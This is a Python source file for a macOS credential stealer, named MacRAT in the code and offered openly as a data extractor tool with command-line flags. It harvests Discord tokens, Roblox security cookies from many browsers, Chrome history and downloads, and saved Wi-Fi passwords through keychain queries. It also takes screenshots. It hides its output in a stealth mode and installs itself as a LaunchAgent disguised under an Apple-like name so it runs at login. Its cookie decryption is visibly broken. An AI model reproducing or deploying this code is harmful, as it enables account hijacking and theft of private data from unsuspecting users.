import os
import re
import base64
import shutil
import sqlite3
import subprocess
import datetime
import threading
import time
import json
import logging
import sys
import argparse
import requests
from pathlib import Path
from typing import List, Dict, Any, Optional, Callable
from Crypto.Cipher import AES
from PIL import ImageGrab

# === CONFIGURATION ===
class Config:
    OUTPUT_DIR = Path.home() / ".extractor_output"
    LOG_FILE = OUTPUT_DIR / "extractor.log"
    SCREENSHOT_NAME = "screen.png"
    HISTORY_LIMIT = 200
    DOWNLOADS_LIMIT = 100
    THREAD_TIMEOUT = 30
    STEALTH = False
    AUTO_START = False
    PLUGIN_DIR = OUTPUT_DIR / "plugins"
    C2_URL = None

# === LOGGING SETUP ===
os.makedirs(Config.OUTPUT_DIR, exist_ok=True)
logging.basicConfig(
    filename=Config.LOG_FILE,
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
)
logger = logging.getLogger("Extractor")

# === PLUGIN SYSTEM ===
class Plugin:
    def run(self, context: Dict[str, Any]):
        pass

class PluginManager:
    def __init__(self, plugin_dir: Path):
        self.plugin_dir = plugin_dir
        self.plugins: List[Plugin] = []
        self.load_plugins()

    def load_plugins(self):
        self.plugin_dir.mkdir(exist_ok=True)
        sys.path.insert(0, str(self.plugin_dir))
        for file in self.plugin_dir.glob("*.py"):
            try:
                name = file.stem
                mod = __import__(name)
                for attr in dir(mod):
                    obj = getattr(mod, attr)
                    if isinstance(obj, type) and issubclass(obj, Plugin) and obj is not Plugin:
                        self.plugins.append(obj())
            except Exception as e:
                logger.error(f"Plugin load error: {file}: {e}")

    def run_all(self, context: Dict[str, Any]):
        for plugin in self.plugins:
            try:
                plugin.run(context)
            except Exception as e:
                logger.error(f"Plugin run error: {plugin}: {e}")

# === UTILITY FUNCTIONS ===
def run_subprocess(cmd: List[str], **kwargs) -> str:
    try:
        return subprocess.check_output(cmd, text=True, stderr=subprocess.DEVNULL, **kwargs)
    except Exception as e:
        logger.error(f"Subprocess error: {cmd} | {e}")
        return ""

def safe_copy(src: Path, dst: Path) -> bool:
    try:
        shutil.copy2(src, dst)
        return True
    except Exception as e:
        logger.error(f"Copy error: {src} -> {dst} | {e}")
        return False

def b64decode_key(key: str) -> bytes:
    try:
        return base64.b64decode(key)[5:]
    except Exception as e:
        logger.error(f"Base64 decode error: {e}")
        return b""

# === CORE EXTRACTOR CLASS ===
class MacRAT:
    def __init__(self, config: Config, plugin_manager: Optional[PluginManager] = None, stealth: Optional[bool] = None):
        self.config = config
        self.home = Path.home()
        self.app_support = self.home / "Library" / "Application Support"
        self.output_dir = config.OUTPUT_DIR
        self.output_dir.mkdir(exist_ok=True, parents=True)
        self.tokens = set()
        self.roblox_cookies = set()
        self.history = []
        self.downloads = []
        self.wifi_passwords = []
        self.errors = []
        self.screenshot_path = self.output_dir / config.SCREENSHOT_NAME
        self.lock = threading.RLock()
        self.chrome_key = self.get_chrome_key()
        self.plugin_manager = plugin_manager or PluginManager(config.PLUGIN_DIR)
        self._setup_stealth(stealth)
        if config.AUTO_START:
            self._setup_autostart()

    def _setup_stealth(self, stealth_override=None):
        stealth = self.config.STEALTH if stealth_override is None else stealth_override
        if stealth:
            sys.stdout = open(os.devnull, "w")
            sys.stderr = open(os.devnull, "w")
        else:
            if hasattr(sys, "__stdout__") and hasattr(sys, "__stderr__"):
                sys.stdout = sys.__stdout__
                sys.stderr = sys.__stderr__

    def _setup_autostart(self):
        plist = f"""
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.extractor</string>
    <key>ProgramArguments</key>
    <array>
        <string>{sys.executable}</string>
        <string>{os.path.abspath(__file__)}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>
"""
        launch_agents = self.home / "Library" / "LaunchAgents"
        launch_agents.mkdir(exist_ok=True)
        plist_path = launch_agents / "com.apple.extractor.plist"
        with open(plist_path, "w") as f:
            f.write(plist)
        subprocess.run(["launchctl", "load", str(plist_path)], check=False)

    def get_chrome_key(self) -> Optional[bytes]:
        try:
            local_state_path = self.home / "Library" / "Application Support" / "Google" / "Chrome" / "Local State"
            with open(local_state_path, "r", encoding="utf-8") as f:
                local_state = json.load(f)
            encrypted_key_b64 = local_state.get("os_crypt", {}).get("encrypted_key", "")
            key = b64decode_key(encrypted_key_b64)
            return None
        except Exception as e:
            self._log_error(f"ChromeKeyError: {e}")
            return None

    def decrypt_value(self, encrypted_bytes: bytes) -> str:
        try:
            if encrypted_bytes[:3] != b'v10':
                return encrypted_bytes.decode(errors='ignore')
            return ""
        except Exception as e:
            self._log_error(f"DecryptError: {e}")
            return ""

    def extract_tokens(self, base_paths: List[Path]):
        token_regex = re.compile(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27,}')
        for base_path in base_paths:
            if not base_path.exists():
                continue
            for file in base_path.glob("*.*"):
                if file.suffix not in {'.log', '.ldb'}:
                    continue
                try:
                    with file.open(errors='ignore') as f:
                        for line in f:
                            for token in token_regex.findall(line.strip()):
                                with self.lock:
                                    self.tokens.add(token)
                except Exception as e:
                    self._log_error(f"TokenReadErr: {file.name} {e}")

    def extract_roblox_cookies(self):
        # Search for Roblox cookies in all Chromium-based browsers and all user app support dirs
        browser_paths = [
            self.home / 'Library' / 'Application Support' / 'Google' / 'Chrome',
            self.home / 'Library' / 'Application Support' / 'Google' / 'Chrome Beta',
            self.home / 'Library' / 'Application Support' / 'Google' / 'Chrome Canary',
            self.home / 'Library' / 'Application Support' / 'Microsoft Edge',
            self.home / 'Library' / 'Application Support' / 'BraveSoftware' / 'Brave-Browser',
            self.home / 'Library' / 'Application Support' / 'Chromium',
            self.home / 'Library' / 'Application Support' / 'Opera Software' / 'Opera Stable',
            self.home / 'Library' / 'Application Support' / 'Vivaldi',
        ]
        found = False
        for base in browser_paths:
            cookies_path = base / 'Default' / 'Cookies'
            if not cookies_path.exists():
                if base.exists():
                    for profile in base.glob('*'):
                        if profile.is_dir() and (profile / 'Cookies').exists():
                            cookies_path = profile / 'Cookies'
                        else:
                            continue
                        temp_path = self.output_dir / f"cookies_temp_{profile.name}"
                        if not safe_copy(cookies_path, temp_path):
                            continue
                        try:
                            conn = sqlite3.connect(str(temp_path))
                            cursor = conn.cursor()
                            cursor.execute("SELECT host_key, name, encrypted_value FROM cookies WHERE host_key LIKE '%roblox.com%'")
                            for host, name, encrypted_val in cursor.fetchall():
                                dec = self.decrypt_value(encrypted_val)
                                if dec and ("roblosecure" in name.lower() or name.lower().startswith(".roblosecure")):
                                    with self.lock:
                                        self.roblox_cookies.add(dec)
                                        found = True
                            cursor.close()
                            conn.close()
                        except Exception as e:
                            self._log_error(f"RobloxCookieError: {e}")
                        finally:
                            temp_path.unlink(missing_ok=True)
                continue
            temp_path = self.output_dir / f"cookies_temp_{base.name}"
            if not safe_copy(cookies_path, temp_path):
                continue
            try:
                conn = sqlite3.connect(str(temp_path))
                cursor = conn.cursor()
                cursor.execute("SELECT host_key, name, encrypted_value FROM cookies WHERE host_key LIKE '%roblox.com%'")
                for host, name, encrypted_val in cursor.fetchall():
                    dec = self.decrypt_value(encrypted_val)
                    if dec and ("roblosecure" in name.lower() or name.lower().startswith(".roblosecure")):
                        with self.lock:
                            self.roblox_cookies.add(dec)
                            found = True
                cursor.close()
                conn.close()
            except Exception as e:
                self._log_error(f"RobloxCookieError: {e}")
            finally:
                temp_path.unlink(missing_ok=True)
        app_support = self.home / 'Library' / 'Application Support'
        for root, dirs, files in os.walk(app_support):
            for file in files:
                if file == 'Cookies':
                    cookies_path = Path(root) / file
                    temp_path = self.output_dir / f"cookies_temp_{hash(str(cookies_path))}"
                    if not safe_copy(cookies_path, temp_path):
                        continue
                    try:
                        conn = sqlite3.connect(str(temp_path))
                        cursor = conn.cursor()
                        cursor.execute("SELECT host_key, name, encrypted_value FROM cookies WHERE host_key LIKE '%roblox.com%'")
                        for host, name, encrypted_val in cursor.fetchall():
                            dec = self.decrypt_value(encrypted_val)
                            if dec and ("roblosecure" in name.lower() or name.lower().startswith(".roblosecure")):
                                with self.lock:
                                    self.roblox_cookies.add(dec)
                                    found = True
                        cursor.close()
                        conn.close()
                    except Exception as e:
                        self._log_error(f"RobloxCookieError: {e}")
                    finally:
                        temp_path.unlink(missing_ok=True)
        # Try to get Roblox security cookie using requests (if user is logged in)
        try:
            session = requests.Session()
            resp = session.get('https://www.roblox.com/')
            for cookie in session.cookies:
                if cookie.domain.endswith('roblox.com') and (cookie.name.lower() == '.roblosecure' or 'roblosecure' in cookie.name.lower()):
                    with self.lock:
                        self.roblox_cookies.add(cookie.value)
        except Exception as e:
            self._log_error(f"RobloxCookieRequestsError: {e}")

    def extract_history(self):
        history_db_path = self.home / 'Library' / 'Application Support' / 'Google' / 'Chrome' / 'Default' / 'History'
        if not history_db_path.exists():
            return
        temp_path = self.output_dir / "history_temp"
        if not safe_copy(history_db_path, temp_path):
            return
        try:
            conn = sqlite3.connect(str(temp_path))
            cursor = conn.cursor()
            cursor.execute(f"SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT {self.config.HISTORY_LIMIT}")
            base_time = datetime.datetime(1601, 1, 1)
            hist = []
            for url, title, last_visit in cursor.fetchall():
                visit_dt = base_time + datetime.timedelta(microseconds=last_visit)
                hist.append({"url": url, "title": title, "last_visit": visit_dt.strftime("%Y-%m-%d %H:%M:%S")})
            with self.lock:
                self.history = hist
            cursor.close()
            conn.close()
        except Exception as e:
            self._log_error(f"HistoryError: {e}")
        finally:
            temp_path.unlink(missing_ok=True)

    def extract_downloads(self):
        history_db_path = self.home / 'Library' / 'Application Support' / 'Google' / 'Chrome' / 'Default' / 'History'
        if not history_db_path.exists():
            return
        temp_path = self.output_dir / "history_temp"
        if not safe_copy(history_db_path, temp_path):
            return
        try:
            conn = sqlite3.connect(str(temp_path))
            cursor = conn.cursor()
            cursor.execute(f"SELECT current_path, tab_url, total_bytes FROM downloads ORDER BY start_time DESC LIMIT {self.config.DOWNLOADS_LIMIT}")
            dl = []
            for path, tab_url, size in cursor.fetchall():
                dl.append({"path": path, "url": tab_url, "size": size})
            with self.lock:
                self.downloads = dl
            cursor.close()
            conn.close()
        except Exception as e:
            self._log_error(f"DownloadsError: {e}")
        finally:
            temp_path.unlink(missing_ok=True)

    def extract_wifi_passwords(self):
        try:
            ssids = set()
            airport_plist = os.path.expanduser("~/Library/Preferences/com.apple.airport.preferences.plist")
            if os.path.exists(airport_plist):
                try:
                    import plistlib
                    with open(airport_plist, 'rb') as f:
                        pl = plistlib.load(f)
                        for net in pl.get('KnownNetworks', {}).values():
                            ssid = net.get('SSIDString')
                            if ssid:
                                ssids.add(ssid)
                except Exception as e:
                    self._log_error(f"WiFiPlistError: {e}")
            scan = run_subprocess([
                "/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport", "-s"
            ])
            for line in scan.strip().split('\n')[1:]:
                if line.strip():
                    ssid = line[:32].strip()
                    if ssid:
                        ssids.add(ssid)
            wifi_info = []
            for ssid in ssids:
                pwd = run_subprocess([
                    "security", "find-generic-password", "-D", "AirPort network password", "-a", ssid, "-w"
                ]).strip()
                wifi_info.append((ssid, pwd))
            with self.lock:
                self.wifi_passwords = wifi_info
        except Exception as e:
            self._log_error(f"WiFiError: {e}")

    def take_screenshot(self):
        try:
            img = ImageGrab.grab()
            img.save(self.screenshot_path)
            img.close()
        except Exception as e:
            self._log_error(f"ScreenshotError: {e}")

    def _log_error(self, msg: str):
        with self.lock:
            self.errors.append(msg)
        logger.error(msg)

    def run_selected(self, tokens=False, roblox=False, browser=False, downloads=False, wifi=False, screenshot=False):
        threads = []
        base_paths = [
            self.app_support / 'discord' / 'Local Storage' / 'leveldb',
            self.app_support / 'discordcanary' / 'Local Storage' / 'leveldb',
            self.app_support / 'Lightcord' / 'Local Storage' / 'leveldb',
            self.app_support / 'discordptb' / 'Local Storage' / 'leveldb',
            self.home / 'Library' / 'Application Support' / 'Google' / 'Chrome' / 'Default' / 'Local Storage' / 'leveldb',
            self.home / 'Library' / 'Application Support' / 'Microsoft Edge' / 'Default' / 'Local Storage' / 'leveldb',
            self.home / 'Library' / 'Application Support' / 'BraveSoftware' / 'Brave-Browser' / 'Default' / 'Local Storage' / 'leveldb',
            self.home / 'Library' / 'Application Support' / 'Chromium' / 'Default' / 'Local Storage' / 'leveldb',
        ]
        if tokens:
            threads.append(threading.Thread(target=self.extract_tokens, args=(base_paths,)))
        if roblox:
            threads.append(threading.Thread(target=self.extract_roblox_cookies))
        if browser:
            threads.append(threading.Thread(target=self.extract_history))
        if downloads:
            threads.append(threading.Thread(target=self.extract_downloads))
        if wifi:
            threads.append(threading.Thread(target=self.extract_wifi_passwords))
        if screenshot:
            threads.append(threading.Thread(target=self.take_screenshot))
        for t in threads:
            t.start()
        for t in threads:
            t.join(timeout=self.config.THREAD_TIMEOUT)
        context = self.get_context()
        self.plugin_manager.run_all(context)

    def get_context(self) -> Dict[str, Any]:
        return {
            "tokens": self.tokens,
            "roblox_cookies": self.roblox_cookies,
            "history": self.history,
            "downloads": self.downloads,
            "wifi_passwords": self.wifi_passwords,
            "errors": self.errors,
            "screenshot_path": self.screenshot_path,
            "output_dir": self.output_dir,
            "config": self.config,
        }

    def save_selected(self, tokens=False, roblox=False, browser=False, downloads=False, wifi=False, screenshot=False):
        out = {}
        if tokens:
            out["tokens"] = list(self.tokens)
        if roblox:
            out["roblox_cookies"] = list(self.roblox_cookies)
        if browser:
            out["history"] = self.history
        if downloads:
            out["downloads"] = self.downloads
        if wifi:
            out["wifi_passwords"] = self.wifi_passwords
        if screenshot:
            out["screenshot_path"] = str(self.screenshot_path)
        out["errors"] = self.errors[-10:]
        out_file = self.output_dir / "collected_data.json"
        with open(out_file, "w", encoding="utf-8") as f:
            json.dump(out, f, indent=2)
        logger.info(f"Data saved to {out_file}")

    def print_selected(self, tokens=False, roblox=False, browser=False, downloads=False, wifi=False, screenshot=False):
        if tokens:
            print("\n=== DISCORD TOKENS ===")
            for t in sorted(self.tokens):
                print(t)
        if roblox:
            print("\n=== ROBLOX SECURITY COOKIES (.ROBLOSECUREROBLOXSECURE) ===")
            if self.roblox_cookies:
                for c in sorted(self.roblox_cookies):
                    print(c)
            else:
                print("No Roblox security cookies found.")
        if browser:
            print("\n=== BROWSER HISTORY (Last 10) ===")
            for h in self.history[:10]:
                print(f"{h['last_visit']} | {h['title']} | {h['url']}")
        if downloads:
            print("\n=== DOWNLOADS (Last 5) ===")
            for d in self.downloads[:5]:
                print(f"{d['path']} | {d['size']} bytes | {d['url']}")
        if wifi:
            print("\n=== WIFI PASSWORDS ===")
            for ssid, pwd in self.wifi_passwords:
                print(f"{ssid:<30} | {pwd}")
        if screenshot:
            print("\n=== SCREENSHOT PATH ===")
            print(self.screenshot_path)
        print("\n=== ERRORS (Last 5) ===")
        for e in self.errors[-5:]:
            print(e)

    def show_saved(self):
        out_file = self.output_dir / "collected_data.json"
        if not out_file.exists():
            print("No saved data found.")
            return
        with open(out_file, "r", encoding="utf-8") as f:
            data = json.load(f)
        if "tokens" in data:
            print("\n=== DISCORD TOKENS ===")
            for t in sorted(data.get("tokens", [])):
                print(t)
        if "roblox_cookies" in data:
            print("\n=== ROBLOX SECURITY COOKIES (.ROBLOSECUREROBLOXSECURE) ===")
            roblox_cookies = data.get("roblox_cookies", [])
            if roblox_cookies:
                for c in sorted(roblox_cookies):
                    print(c)
            else:
                print("No Roblox security cookies found.")
        if "history" in data:
            print("\n=== BROWSER HISTORY (Last 10) ===")
            for h in data.get("history", [])[:10]:
                print(f"{h['last_visit']} | {h['title']} | {h['url']}")
        if "downloads" in data:
            print("\n=== DOWNLOADS (Last 5) ===")
            for d in data.get("downloads", [])[:5]:
                print(f"{d['path']} | {d['size']} bytes | {d['url']}")
        if "wifi_passwords" in data:
            print("\n=== WIFI PASSWORDS ===")
            for ssid, pwd in data.get("wifi_passwords", []):
                print(f"{ssid:<30} | {pwd}")
        if "screenshot_path" in data:
            print("\n=== SCREENSHOT PATH ===")
            print(data.get("screenshot_path", ""))
        print("\n=== ERRORS (Last 5) ===")
        for e in data.get("errors", [])[-5:]:
            print(e)

# === MAIN CLI ===
def main():
    parser = argparse.ArgumentParser(
        description="Mac Data Extractor Tool (nmap-style flags)",
        formatter_class=argparse.RawTextHelpFormatter,
        epilog="""
Examples:
  python main.py -t -r -w         # Extract Discord tokens, Roblox cookies, and WiFi passwords
  python main.py -b -d --save    # Extract browser history and downloads, save to file
  python main.py --show          # Show last saved results
  python main.py -r --stealth    # Extract Roblox cookies silently
  python main.py -t -r -w -s     # Extract tokens, Roblox, WiFi, and take screenshot
        """
    )
    parser.add_argument("-t", "--tokens", action="store_true", help="Extract Discord tokens")
    parser.add_argument("-r", "--roblox", action="store_true", help="Extract Roblox security cookies (local and via requests)")
    parser.add_argument("-b", "--browser", action="store_true", help="Extract browser history")
    parser.add_argument("-d", "--downloads", action="store_true", help="Extract browser downloads")
    parser.add_argument("-w", "--wifi", action="store_true", help="Extract WiFi SSIDs and passwords")
    parser.add_argument("-s", "--screenshot", action="store_true", help="Take a screenshot")
    parser.add_argument("--save", action="store_true", help="Save results to file instead of printing")
    parser.add_argument("--show", action="store_true", help="Show last saved results")
    parser.add_argument("--stealth", action="store_true", help="Suppress all output")
    args = parser.parse_args()
    if args.show:
        rat = MacRAT(Config, stealth=args.stealth)
        rat.show_saved()
        return
    if not (args.tokens or args.roblox or args.browser or args.downloads or args.wifi or args.screenshot):
        parser.error("No extraction selected. Use -t, -r, -b, -d, -w, -s or --show.")
    rat = MacRAT(Config, stealth=args.stealth)
    rat.run_selected(tokens=args.tokens, roblox=args.roblox, browser=args.browser, downloads=args.downloads, wifi=args.wifi, screenshot=args.screenshot)
    if args.save:
        rat.save_selected(tokens=args.tokens, roblox=args.roblox, browser=args.browser, downloads=args.downloads, wifi=args.wifi, screenshot=args.screenshot)
        if not args.stealth:
            print("Data saved to", rat.output_dir / "collected_data.json")
    else:
        if not args.stealth:
            rat.print_selected(tokens=args.tokens, roblox=args.roblox, browser=args.browser, downloads=args.downloads, wifi=args.wifi, screenshot=args.screenshot)

if __name__ == "__main__":
    main()
